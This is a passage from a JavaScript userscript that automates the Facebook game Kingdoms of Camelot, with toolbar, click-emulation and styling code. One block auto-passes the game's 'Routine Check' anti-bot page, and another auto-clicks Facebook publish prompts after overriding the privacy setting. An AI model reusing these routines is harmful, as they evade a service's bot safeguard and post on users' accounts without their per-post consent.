"url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/abstrac-green.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground51") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/abstrac-green2.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground52") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/abstrac-rosa.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground53") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/blue-drop.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground54") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/electronic-monochro.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground55") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/octo-redux.gif')";		if (Options.pdxBackgroundStyle=="pdxBackground56") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/pink-cheetah.gif')";		if (Options.pdxBackgroundStyle=="pdxBackground57") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/ruby-sundial.gif')";		if (Options.pdxBackgroundStyle=="pdxBackground58") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/seamless-flower.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground59") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/straw-flowers.gif')";		if (Options.pdxBackgroundStyle=="pdxBackground60") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/victorian-damask1.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground61") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/victorian-damask2.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground62") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/victorian-damask3.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground63") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/victorian-damask4.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground64") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/modern-warfare-3.gif')";
		break;
        }
       }
    }
     var e = document.getElementById('pageHead');
    if(e){
      e.style.width = '80%';
      e.style.margin = '0 10%';
    }
    var e = document.getElementById('bottomContent');
    if(e){
      e.style.padding = "0px 0px 12px 0px";
    }
    }
    facebookWatchdog();
    if (GlobalOptions.pbWideScreen)
       setWide();
  }
  function kabamStandAlone (){
  function setWide (){
	var iFrames = document.getElementsByTagName('IFRAME');
	if (!iFrames){
	  setTimeout (setWide, 1000);
	  return;
	}
	for(var f = 0; f<iFrames.length; f++){
		if(iFrames[f].src.match(/kingdomsofcamelot\.com\/fb\/.*?\/standAlone\.php/i)){
			iFrames[f].style.width = '100%';
			document.getElementById('content').style.width = '100%';
		}
		if(iFrames[f].src.match(/kingdomsofcamelot\.com\/fb\/.*?\/main_src\.php/i)){
			iFrames[f].style.width = '100%';
		}
	}
  }
  if (GlobalOptions.pbWideScreen)
    setWide();
}
 function HandlePublishPopup() {
    if(GlobalOptions.autoPublishGamePopups){
      var FBInputForm = document.getElementById('uiserver_form');
       if(FBInputForm){
         var channel_input = nHtml.FindByXPath(FBInputForm,".//input[contains(@name,'channel')]");
         if(channel_input){
           var current_channel_url = channel_input.value;
           if (current_channel_url.match(/(http|https):\/\/.{0,100}kingdomsofcamelot\.com\/.*?\/cross_iframe\.htm/i)) {
          var publish_button = nHtml.FindByXPath(FBInputForm,".//input[@type='submit' and contains(@name,'publish')]");
            var privacy_setting = nHtml.FindByXPath(FBInputForm,".//select[@name='audience[0][value]']");
          if(publish_button && privacy_setting){
              privacy_setting.innerHTML = '<option value="'+ GlobalOptions.autoPublishPrivacySetting +'"></option>';
			  privacy_setting.selectedIndex = 0;
              nHtml.Click(publish_button);
          }
          }
      }
      }
      setTimeout(HandlePublishPopup, 1000);
    }
  }
  
/************ KOC POWER - CAPCHA ************************************************/
if (Options.pdxCaptchaFix) {
var captchas= document.getElementById("contents");
var link;
if(captchas){
	if(captchas.textContent.match('.*(Routine Check).*')){
		link = captchas.getElementsByTagName("a")[1].href;
		setTimeout(pdxCaptcha,250);//use a delay
		
	}
}
function pdxCaptcha(){
	location.href = link;
}
}
/************ KOC POWER - KSX BUTTLER ********************************************/
/************ the code is from ksx with some changes *****************************/
/************ don't touch unasked (managed by ksx) *******************************/
/*********************************************************************************/
// KSX VERSION
ksxVersion = "2011.09.19 beta";
ksxEnabled = true;
ksxFriendHelpEnabled = false; //BETA
ksxDebug = false;

//#region Main

//DEBUGCODE for finding the proper page
//if(ksxDebug) GM_log("Loading document: " +
//	"id=" + document.getElementsByTagName("html")[0].getAttribute("id") + " title: " + document.title + 
//	" \n\t" + "href: " + document.location.href);

// @include       *.kingdomsofcamelot.com/fb/e2/src/main_src.php*
if (ksxEnabled && document.body.id == 'mainbody') {
	//	/*DEBUGCODE:*/if(ksxDebug) GM_log("Setup KoC Buttler \n" + "location: " + document.location.href);

	ksx = unsafeWindow.ksx = new KsxLibrary();
	//ksx.koc.lang = ksx.koc.getLanguage();
	ksx.koc.lang = LangOptions.culang;
	ksx.compatibility.disableMarchXYPaste = false; // [Attack]

	//GM_log("INFO: language " + ksx.koc.lang + " / " + culang.ksx_KoCButtler_language);
	//special configuration removed into plugin
	
	// Toolbar Configuration
	ksx.configuration.toolbar = {items: []};
	if (Options.NeueNachricht  ) ksx.configuration.toolbar.items.push(["Button", , culang.composemessages, "ksx.plugins.Toolbar.macros.newMessage(); return false;"]);
	if (Options.MeineBerichte  ) ksx.configuration.toolbar.items.push(["Button", , culang.viewmessages, "modal_messages();track_chrome_btn('messages_btn');Messages.listReports();return false;"]);
	//ksx.configuration.toolbar.items.push(["Button", , "R", "ksx.tools.click('//*[@id=\"pbtcBerichte\"]/a'); return false;"]);
	if (Options.AllianzBerichte) ksx.configuration.toolbar.items.push(["Button", , culang.alliancereports, "modal_alliance();track_chrome_btn('alliance_btn');allianceReports();modal_alliance_changetab(4);return false;"]);
	//			["Button", , "Einladung", "modal_alliance();track_chrome_btn('alliance_btn');inviteFriendsModule();return false;"],
	//NOTWORKING["Button", , "Einladung", "modal_alliance();track_chrome_btn('alliance_btn');inviteFriendsModule();WAIT;searchTabInAllianceInvite();return false;"],
	//			["LineBreak"],	
	if (Options.scSeperator1   ) ksx.configuration.toolbar.items.push(["Separator", ]);
	//			["Button",, "Truppen aussenden", "modal_attack(4,'','');return false;"],
	//			["Button", , "Sp?h", "ksx.plugins.Toolbar.macros.newMarch(3, '','', [0,0,1,0,0,0,0,0,0,0,0,0], [0,0,0,0,0] );return false;"],
	if (Options.Verstaerken    ) ksx.configuration.toolbar.items.push(["Button", , culang.reinforce, "ksx.plugins.Toolbar.macros.newMarch(2, '','', [0,0,0,0,0,0,0,0,0,0,0,0], [0,0,0,0,0] );return false;"]);
	if (Options.Neuzuordnen    ) ksx.configuration.toolbar.items.push(["Button", , culang.reassign, "ksx.plugins.Toolbar.macros.newMarch(5, '','', [0,0,0,0,0,0,0,0,0,0,0,0], [0,0,0,0,0] );return false;"]);
	if (Options.Transport      ) ksx.configuration.toolbar.items.push(["Button", , culang.transport, "ksx.plugins.Toolbar.macros.newMarch(1, '','', [0,0,0,0,0,0,0,0,0,0,0,0], [0,0,0,0,0] );return false;"]);
	if (Options.Wiederholen    ) ksx.configuration.toolbar.items.push(["Button", "ksxMarchExtenderRepeatOpen", culang.repeat, ""]);
	//			["Button","ksxMarchExtenderRepeatMarch", "Wiederholen!"     , ""],
	//			["Button",, "Dump Seed"        , "ksx.plugins.Toolbar.macros.dumpSeed(); return false;"],
	//};
	
	ksx.configuration.powertoolbar = {items: [], syncButtons: []};
	if (Options.AutoTransport  ) ksx.configuration.powertoolbar.items.push(["Button", "ksxpbTraderState", culang.transport+" ${[x]}", ""]);
	if (Options.AutoNeuzuordnen) ksx.configuration.powertoolbar.items.push(["Button", "ksxpbReassignState", culang.screassign+" ${[x]}", ""]);
	if (Options.scSeperator2   ) ksx.configuration.powertoolbar.items.push(["Separator"]);
	if (Options.scCrest        ) ksx.configuration.powertoolbar.items.push(["Button", "ksxpbCrest", culang.crest+" ${[x]}", ""]);
	if (Options.DarkForestButton ) ksx.configuration.powertoolbar.items.push(["Button", "ksxpbDarkForest", culang.darkforest+" ${[x]}", ""]);
	if (Options.scSeperator2   ) ksx.configuration.powertoolbar.items.push(["Separator"]);
	if (Options.scRaidReset    ) ksx.configuration.powertoolbar.items.push(["Button", "ksxpbRaidStart", culang.raidreset+" ${[x]}", ""]);
	if (Options.AutoRefresh    ) ksx.configuration.powertoolbar.items.push(["Button", "ksxpbEveryEnable", culang.arefresh+" ${[x]}", ""]);
	if (Options.scLinebreak    ) ksx.configuration.powertoolbar.items.push(["LineBreak"]);
	if (Options.AutoBau        ) ksx.configuration.powertoolbar.items.push(["Button", "ksxpbBuildRunning", culang.autobuild+" ${[x]}", ""]);
	if (Options.Makieren       ) ksx.configuration.powertoolbar.items.push(["Button", "ksxpbBuildMode", culang.buildmode+" ${[x]}", ""]);
	if (Options.Hilfe          ) ksx.configuration.powertoolbar.items.push(["Button", "ksxpbHelpRequest", culang.askhelp+" ${[x]}", ""]);
	if (Options.scSeperator2   ) ksx.configuration.powertoolbar.items.push(["Separator"]);
	if (Options.scAutoTrain    ) ksx.configuration.powertoolbar.items.push(["Button", "ksxpbAutoTrain", culang.autotrain+" ${[x]}", ""]);			
	if (Options.scCrafting     ) ksx.configuration.powertoolbar.items.push(["Button", "ksxpbCrafting", culang.crafting+" ${[x]}", ""]);
	
	ksx.configuration.powertoolbar.syncButtons = [
		["ksxpbTraderState"  , "pbTraderState", "value", " = " +culang.buttonon],
		["ksxpbReassignState", "pbReassignState", "value", " = "+culang.buttonon],
		["ksxpbBuildRunning", "pbBuildRunning", "value", " = "+culang.buttonon],
		["ksxpbBuildMode", "pbBuildMode", "value", " = "+culang.buttonon],
		["ksxpbRaidStart", "pbRaidStart", "value", " = "+culang.buttonon],
		["ksxpbAutoTrain", "pbAutoTrainState", "value", " = "+culang.buttonon],
		["ksxpbCrafting", "pbCraftRunning", "value", " = "+culang.buttonon],
		["ksxpbCrest", "Cresttoggle", "value", " = "+culang.buttonon],
		["ksxpbDarkForest", "AttSearch", "value", " = "+culang.buttonon],
		["ksxpbHelpRequest"  , "pbHelpRequest", "checked","true"],
		["ksxpbEveryEnable", "pbEveryEnable", "checked", "true"],
	]
	
	// Chat Configuration
	ksx.configuration.chat = {
		enableTimeCorrection: true,
		backgrounds: {
			RequestItemBackground: 'lightgreen',
			OwnItemBackground    : 'lightgray',
			InfoBackground       : "#E0E060",   //Colors.SpamBackground,
			//AllyAttackBackground : "#FFB0E0",
			//OwnAttackBackground  : "#FF8080"
		}
	};
	
	//if (Options.DeskInfo       ) ksx.plugins.DeskInfo        = new DeskInfoPlugin(ksx);              
	if (Options.scToolbar      ) ksx.plugins.Toolbar         = new ToolbarPlugin(ksx);
	if (Options.scToolbar      ) ksx.plugins.PowerToolbar    = new PowerToolbarPlugin(ksx);
	if (Options.scToolbar      ) ksx.plugins.ChatMonitor     = new ChatMonitorPlugin(ksx);
	if (Options.scToolbar      ) ksx.plugins.ResourceRequest = new ResourceRequestPlugin(ksx); //requires ChatMonitor
	if (Options.scToolbar      ) ksx.plugins.MarchExtender   = new MarchExtenderPlugin(ksx);   //requires Toolbar
	if (true                   ) ksx.plugins.Reports         = new ReportsPlugin(ksx);         //requires Toolbar		
}
//#endregion

function KsxLibrary() {
	if(ksxDebug) GM_log(new Date().toTimeString().substring(0, 8) + '.' + new Date().getMilliseconds() + ': ' + "KsxLibrary");
	
	var JSON= {}; (function () { "use strict"; function f(n) { return n < 10 ? '0' + n : n; } if (typeof Date.prototype.toJSON !== 'function') { Date.prototype.toJSON = function (key) { return isFinite(this.valueOf()) ? this.getUTCFullYear() + '-' + f(this.getUTCMonth() + 1) + '-' + f(this.getUTCDate()) + 'T' + f(this.getUTCHours()) + ':' + f(this.getUTCMinutes()) + ':' + f(this.getUTCSeconds()) + 'Z' : null; }; String.prototype.toJSON = Number.prototype.toJSON = Boolean.prototype.toJSON = function (key) { return this.valueOf(); }; } var cx = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g, escapable = /[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g, gap, indent, meta = { '\b': '\\b', '\t': '\\t', '\n': '\\n', '\f': '\\f', '\r': '\\r', '"': '\\"', '\\': '\\\\' }, rep; function quote(string) { escapable.lastIndex = 0; return escapable.test(string) ? '"' + string.replace(escapable, function (a) { var c = meta[a]; return typeof c === 'string' ? c : '\\u' + ('0000' + a.charCodeAt(0).toString(16)).slice(-4); }) + '"' : '"' + string + '"'; } function str(key, holder) { var i, k, v, length, mind = gap, partial, value = holder[key]; if (value && typeof value === 'object' && typeof value.toJSON === 'function') { value = value.toJSON(key); } if (typeof rep === 'function') { value = rep.call(holder, key, value); } switch (typeof value) { case 'string': return quote(value); case 'number': return isFinite(value) ? String(value) : 'null'; case 'boolean': case 'null': return String(value); case 'object': if (!value) { return 'null'; } gap += indent; partial = []; if (Object.prototype.toString.apply(value) === '[object Array]') { length = value.length; for (i = 0; i < length; i += 1) { partial[i] = str(i, value) || 'null'; } v = partial.length === 0 ? '[]' : gap ? '[\n' + gap + partial.join(',\n' + gap) + '\n' + mind + ']' : '[' + partial.join(',') + ']'; gap = mind; return v; } if (rep && typeof rep === 'object') { length = rep.length; for (i = 0; i < length; i += 1) { k = rep[i]; if (typeof k === 'string') { v = str(k, value); if (v) { partial.push(quote(k) + (gap ? ': ' : ':') + v); } } } } else { for (k in value) { if (Object.hasOwnProperty.call(value, k)) { v = str(k, value); if (v) { partial.push(quote(k) + (gap ? ': ' : ':') + v); } } } } v = partial.length === 0 ? '{}' : gap ? '{\n' + gap + partial.join(',\n' + gap) + '\n' + mind + '}' : '{' + partial.join(',') + '}'; gap = mind; return v; } } if (typeof JSON.stringify !== 'function') { JSON.stringify = function (value, replacer, space) { var i; gap = ''; indent = ''; if (typeof space === 'number') { for (i = 0; i < space; i += 1) { indent += ' '; } } else if (typeof space === 'string') { indent = space; } rep = replacer; if (replacer && typeof replacer !== 'function' && (typeof replacer !== 'object' || typeof replacer.length !== 'number')) { throw new Error('JSON.stringify'); } return str('', { '': value }); }; } if (typeof JSON.parse !== 'function') { JSON.parse = function (text, reviver) { var j; function walk(holder, key) { var k, v, value = holder[key]; if (value && typeof value === 'object') { for (k in value) { if (Object.hasOwnProperty.call(value, k)) { v = walk(value, k); if (v !== undefined) { value[k] = v; } else { delete value[k]; } } } } return reviver.call(holder, key, value); } text = String(text); cx.lastIndex = 0; if (cx.test(text)) { text = text.replace(cx, function (a) { return '\\u' + ('0000' + a.charCodeAt(0).toString(16)).slice(-4); }); } if (/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, '@').replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, ']').replace(/(?:^|:|,)(?:\s*\[)+/g, ''))) { j = eval('(' + text + ')'); return typeof reviver === 'function' ? walk({ '': j }, '') : j; } throw new SyntaxError('JSON.parse'); }; } } ());
	this.JSON = JSON;

	String.prototype.trim = function() { return this.replace( /^\s+|\s+$/g , ''); };
	
	this.logit = function(msg) {
		var now = new Date();
		GM_log(this.koc.getServerId() + ' @ ' + now.toTimeString().substring(0, 8) + '.' + now.getMilliseconds() + ': ' + msg);
	};

	var tools = {

		getElement: function (locator, logError) {
			//TODO: implement functionality of Selenium element locators
			// http://release.seleniumhq.org/selenium-core/1.0/reference.html
			if (locator.search('//') == 0) return this.getElementByXPath(locator, logError);
			if (locator.search('xpath=') == 0) return this.getElementByXPath(locator.substr(6, locator.length - 6), logError);
			//TODO: if (locator.search('css=') == 0) return this.getElementByCssPath(locator.substr(4, locator.length - 4), logError);
			//TODO: if (locator.search('document.') == 0) return this.getElementByDom(locator.substr(4, locator.length - 4), logError);
			//TODO: if (locator.search('dom=') == 0) return this.getElementByDom(locator.substr(4, locator.length - 4), logError);
			if (locator.search('id=') == 0) return this.getElementById(locator, logError);
			//TODO: if (locator.search('link=') == 0) return document.getElementByLink(locator);
			//TODO: if (locator.search('identifier=') == 0) ...
			var elmt = document.getElementById(locator); if (elmt != null) return elmt;
			elmt=document.getElementsByName(locator);
			if (logError && !elmt) GM_log("WARNING: locator not found!" + "\n\tlocator: " + locator + "\n\tUniqueID: {04003277-0D38-4D60-996B-7F0EA5AA04E9}" + (typeof logError !== "boolean" ? "\n\tTag: " + logError : ""));
			return elmt;
		},

		//used by getElement
		/*private*/ getElementById: function (locator, logError) {
			var elmt = document.getElementById(locator);
			if (logError && !elmt) GM_log("WARNING: locator not found!" + "\n\tlocator: " + locator + "\n\tUniqueID: {4DFB36F4-F2D6-4982-87E6-8A2A8957E74E}" + (typeof logError !== "boolean" ? "\n\tTag: " + logError : ""));
			return elmt;
		},

		//used by getElement
		/*private*/ getElementByXPath: function (expr, logError) {
			var d = document;
			var elmFirstResult = d.evaluate(expr, document,
				null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
			if (logError && !elmFirstResult) GM_log("WARNING: locator not found!" +"\n\tlocator: " + expr + "\n\tUniqueID: {29D43133-ADCE-473F-A9E1-C61CD1EA005E}" +(typeof logError !== "boolean" ? "\n\tTag: " + logError : ""));
			return elmFirstResult;
		},

		//TODO: getElementByCssPath: function (expr) {},
		//TODO: getElementByDom: function (expr) {},
		//TODO: getElementByLink: function (expr) {},

		getAttribute: function (attributeLocator) {
			var index = attributeLocator.lastIndexOf('@');
			var locator = attributeLocator.substr(0, index);
			var attribute = attributeLocator.substring(index + 1, attributeLocator.length);
			//alert(locator + " " + attribute);
			var elmt = this.getElement(locator);
			var attrValue = elmt.getAttribute(attribute);
			return attrValue;
		},

		click: function (element) {
			if (element === null || element === undefined) throw "Element not specified!";
			if (typeof (element) == "string") element = this.getElement(element);

			var evt = document.createEvent("MouseEvents");
			evt.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
			var canceled = !element.dispatchEvent(evt);
			//OPTIONAL: if (canceled) { /* A handler called preventDefault */ } else {/* None of the handlers called preventDefault*/}
		},

		uncheck: function (element) {
			if (element === null || element === undefined) throw "Element not specified!";
			if (typeof (element) == "string") element = this.getElement(element);
			if (typeof element.checked == "undefined") return; //Klick-Buttons (input type="button")  Checkboxen(input type="checkbox")  Radio-Buttons(input type="radio") 
			if (!element.checked) return;

			var evt = document.createEvent("MouseEvents");
			evt.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
			var canceled = !element.dispatchEvent(evt);
			//OPTIONAL: if (canceled) { /* A handler called preventDefault */ } else {/* None of the handlers called preventDefault*/}
		},

		check: function (element) {
			if (element === null || element === undefined) throw "Element not specified!";
			if (typeof (element) == "string") element = this.getElement(element);
			if (typeof element.checked == "undefined") return;

			if (element.checked) return;

			var evt = document.createEvent("MouseEvents");
			evt.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
			var canceled = !element.dispatchEvent(evt);
			//OPTIONAL: if (canceled) { /* A handler called preventDefault */ } else {/* None of the handlers called preventDefault*/}
		},

		typeKeys: function (element, chars) {
			if (element == null) throw "Element not specified!";
			if (typeof (element) == "string") element = this.getElement(element);
			for (var i = 0; i < chars.length; i++) {
				// Create the key press event.
				var pressEvent = document.createEvent('KeyboardEvent');
				pressEvent.initKeyEvent("keypress", true, true, window, false, false, false, false, 0, chars.charCodeAt(i));

				element.dispatchEvent(pressEvent); // Press the key.
			}
		},

		typeKeys2: function (element, chars) {
			if (element == null) throw "ERROR: typeKeys2 - Element not specified!";
			if (typeof (element) == "string") element = this.getElement(element);

			element.focus();

			for (var i = 0; i < String(chars).length; i++) {
				var c = String(chars).charCodeAt(i);

				var downEvent = document.createEvent('KeyboardEvent');
				downEvent.initKeyEvent("keydown", true, true, window, false, false, false, false, 0, c);
				element.dispatchEvent(downEvent);

				var pressEvent = document.createEvent('KeyboardEvent');
				pressEvent.initKeyEvent("keypress", true, true, window, false, false, false, false, 0, c);
				element.dispatchEvent(pressEvent);

				var upEvent = document.createEvent('KeyboardEvent');
				upEvent.initKeyEvent("keyup", true, true, window, false, false, false, false, 0, c);
				element.dispatchEvent(upEvent);
			}
		},

		type: function (element, chars) {
			if (element == null) throw "Element not specified!";
			if (typeof (element) == "string") element = this.getElement(element);

			if (element.type == 'text') {
				element.focus();
				element.value = chars;
			} else {
				throw "Element not supported!";
			}
		},

		emulateFocus: function (element) {
			emulateEvent(element, "focus");
		},

		emulateEvent: function (element, eventName) {
			var options = extend(defaultOptions, arguments[2] || {});
			var oEvent, eventType = null;
			for (var name in eventMatchers) {
				if (eventMatchers[name].test(eventName)) { eventType = name; break; }
			}
			if (!eventType) throw new SyntaxError('Only HTMLEvents and MouseEvents interfaces are supported');
			if (document.createEvent) {
				oEvent = document.createEvent(eventType);
				if (eventType == 'HTMLEvents') {
					oEvent.initEvent(eventName, options.bubbles, options.cancelable);
				} else {
					oEvent.initMouseEvent(eventName, options.bubbles, options.cancelable, document.defaultView,
					 	options.button, options.pointerX, options.pointerY, options.pointerX, options.pointerY,
					 	options.ctrlKey, options.altKey, options.shiftKey, options.metaKey, options.button, element);
				}
				element.dispatchEvent(oEvent);
			} else {
				options.clientX = options.pointerX;
				options.clientY = options.pointerY;
				var evt = document.createEventObject();
				oEvent = extend(evt, options);
				element.fireEvent('on' + eventName, oEvent);
			}
			return element;
		},

		extend: function (destination, source) {
			for (var property in source) destination[property] = source[property];
			return destination;
		},

		eventMatchers: {
			'HTMLEvents': /^(?:load|unload|abort|error|select|change|submit|reset|focus|blur|resize|scroll)$/,
			'MouseEvents': /^(?:click|dblclick|mouse(?:down|up|over|move|out))$/
		},
		defaultOptions: { pointerX: 0, pointerY: 0, button: 0, ctrlKey: false, altKey: false, shiftKey: false, metaKey: false, bubbles: true, cancelable: true },

		doUnsafeWindow: function (func, executeByEmbed) {
			if (this.isChrome || executeByEmbed) {
				var scr = document.createElement('script');
				scr.innerHTML = func;
				document.body.appendChild(scr);
			} else {
				try {
					eval("unsafeWindow." + func);
				} catch (error) {
					logit("Bei DoUnsafeWindow hat JavaScript ein fehler gefunden! Meldung: " + error.description);
				}
			}
		},

		findParentByTagName: function (elmt, tagName, findSelf) {
			if (findSelf && elmt.tagName.toLowerCase() == tagName.toLowerCase()) return elmt;
			var t = elmt;
			while (t) {
				try { t = t.parentNode; } catch (ex) { return null; };
				if (t == null) return null;
				//GM_log(t.tagName);
				if (t.tagName.toLowerCase() == tagName.toLowerCase()) break;
			}
			return t;
		},
		
		typeOf:function(v) {
			if (v == undefined) return 'undefined';
			if (typeof(v) == 'object') {
				if (!v) return 'null';
		//    else if (unsafeWindow.Object.prototype.toString.apply(v) === '[object Array]')
				else if (v.constructor.toString().indexOf("Array") >= 0 && typeof(v.splice) == 'function') return 'array';
				else return 'object';
			}
			return typeof(v);
		},

		className: "KSX+Tools"
	};
	this.tools = tools;

	var selenium = {
		// a small try to implement some Selenium functionality

		click: function(locator) {
			logit("Selenium: click | " + locator);
			var elmt = tools.getElement(locator);
			if (elmt == null) {
				throw "Element not found (" + locator + ")";
			}
			tools.click(elmt);
		},

		getAttribute: function(attributeLocator) {
			logit("Selenium: getAttribute | " + attributeLocator);
			return tools.getAttribute(attributeLocator);
		},

		getElement: function(locator) {
			logit("Selenium: getElement | " + locator);
			return tools.getElement(locator);
		},

		getElementPresent: function(locator) {
			logit("Selenium: getElementPresent | " + locator);
			return tools.getElement(locator) != null;
		},

		waitforElementPresent: function(locator) {
			logit("Selenium: waitforElementPresent | " + locator);
			var tot = new Date().getTime() + 30000;

			do { //because there is no sleep, this will use 100% CPU :-( 
				if (tools.getElementPresent(locator)) return true;
			} while (new Date().getTime() < tot)
			throw "Timeout on waiting for element!";
		},

		className: "KSX.Selenium"
	};
	this.Selenium = selenium;

	/// <summary> Provides funtions to create HTML elements </summary>
	var builder = {

		/// <summary>Creates a blue button </summary>
		BlueButton: function (caption, onclick, id) {
			var a = document.createElement('a');
			if (typeof (onclick) == "string") { a.setAttribute("onclick", onclick); }
			else if (typeof (onclick) == "function") { a.addEventListener("click", onclick, true); }
			else throw "Invalid argument!";
			a.setAttribute("class", "button20");
			a.setAttribute("href", "#");
			if (id) a.setAttribute("id", id);
			var span = document.createElement('span');
			a.appendChild(span);
			span.appendChild(document.createTextNode(caption));
			return a;
		},

		//TODO: DRAFT same as BlueButton but inline
		BlueButton2: function (caption, onclick, id) {
			var a = document.createElement('a');
			if (typeof (onclick) == "string") { a.setAttribute("onclick", onclick); }
			else if (typeof (onclick) == "function") { a.addEventListener("click", onclick, true); }
			else throw "Invalid argument!";
			a.setAttribute("style", "background: url('img/button20_cap.png') no-repeat scroll right top transparent;color: #FFFFFF;cursor: pointer;display: inline; font-size: 12px; font-weight: bold; height: 22px; margin-left: 6px; margin-right: 6px; margin-right: 6px; margin-right: 6px; padding: 2px 8px 5px 0px; text-decoration: none;");
			if (id) a.setAttribute("id", id);
			var span = document.createElement('span');
			span.setAttribute("style", "background: url('img/button20.png') no-repeat scroll 0 0 transparent; padding: 2px 0 5px 8px;");
			a.appendChild(span);
			span.appendChild(document.createTextNode(caption));
			return a;
		},
		ToolbarButton: function (caption, onclick, id) {
			// TODO KSX replace koc-power-pdx.googlecode.com referrence. (Not allowed in library)
			var checked = 'http://koc-power-pdx.googlecode.com/svn/trunk/img/CheckChecked2.png';
			var unchecked = 'http://koc-power-pdx.googlecode.com/svn/trunk/img/CheckUnchecked3.png';
			var unknown = 'http://koc-power-pdx.googlecode.com/svn/trunk/img/CheckUnknown2.png';
			
			var a = document.createElement('a');
			if (typeof (onclick) == "string") { a.setAttribute("onclick", onclick); }
			else if (typeof (onclick) == "function") { a.addEventListener("click", onclick, true); }
			else throw "Invalid argument!";
			a.setAttribute("style", "background: url('img/button20_cap.png') no-repeat scroll right top transparent;color: #DFDFFF;cursor: pointer;display: inline; font-size: 11px; font-weight: bold; height: 22px; margin-right:1px;margin-left:1px; padding: 2px 8px 5px 0px; text-decoration: none;");
			if (id) a.setAttribute("id", id);
			var span = document.createElement('span');
			span.setAttribute("style", "background: url('img/button20.png') no-repeat scroll 0 0 transparent; line-height: 15px; padding: 2px 0 5px 8px;");
			a.appendChild(span);
			//span.appendChild(document.createTextNode(caption));
			//caption = caption.replace("${[x]}", "<span style='color:#00FF00; font-size:16px; vertical-align:middle;'>"+culang.shrbtnchecked+"</span>"); //?
			caption = caption.replace("${[x]}", "<img alt='checked' src='"+checked+"'/>"); 
			//caption = caption.replace("${[ ]}", "<span style='color:#FF4444; font-size:16px; vertical-align:middle;'>"+culang.shrbtnnotchecked+"</span>");
			caption = caption.replace("${[ ]}", "<img alt='unchecked' src='"+unchecked+"'/>"); 
			//caption = caption.replace("${[?]}", "<span style='color:#AAAAAA; font-size:16px; vertical-align:middle;'>"+culang.shrbtnnotfound+"</span>");
			caption = caption.replace("${[ ]}", "<img alt='unknown' src='"+unknown+"'/>"); 
			
			span.innerHTML = caption;
			return a;
		},

		setToolbarCheckButton: function (button, value) {
			// TODO KSX replace koc-power-pdx.googlecode.com referrence. (Not allowed in library)
			var checked = 'http://koc-power-pdx.googlecode.com/svn/trunk/img/CheckChecked2.png';
			var unchecked = 'http://koc-power-pdx.googlecode.com/svn/trunk/img/CheckUnchecked3.png';
			var unknown = 'http://koc-power-pdx.googlecode.com/svn/trunk/img/CheckUnknown2.png';
			
			var chk = button.childNodes[0].childNodes[button.childNodes[0].childNodes.length-1];
//			if (chk.innerHTML != ""+culang.shrbtnnotfound+"" && chk.innerHTML != ""+culang.shrbtnchecked+"" && chk.innerHTML != ""+culang.shrbtnnotchecked+"") {
//				GM_log("Invalid CheckButton content! '" + chk.innerHTML + "'");
//				return;
//			}
//			chk.style.color = value === null ? "#AAAAAA" : (value ? "#00FF00" : "#FF4444");
//			chk.innerHTML = value === null ? ""+culang.shrbtnnotfound+"" : (value ? ""+culang.shrbtnchecked+"" : ""+culang.shrbtnnotchecked+"");
			chk.alt = value === null ? "unknown" : (value ? "checked" : "unchecked");
			chk.src = value === null ? unknown : (value ? checked : unchecked);
		},

		ComTabButton: function (caption, onclick, id) {
			var comTabButtonStyle ='';
			if (Options.pbChatOnRight==true) var comTabButtonStyle = 'background: #141516; line-height: 35px; -moz-box-shadow: 0 0 3px 3px #141516; padding: 0px 6px; margin-left: 10px';
			if (Options.pbChatOnRight==false) var comTabButtonStyle = 'margin-left: 10px; line-height: 35px;';
			var a = document.createElement('a');
			if (typeof (onclick) == "string") { a.setAttribute("onclick", onclick); }
			else if (typeof (onclick) == "function") { a.addEventListener("click", onclick, true); }
			else throw "Invalid argument!";
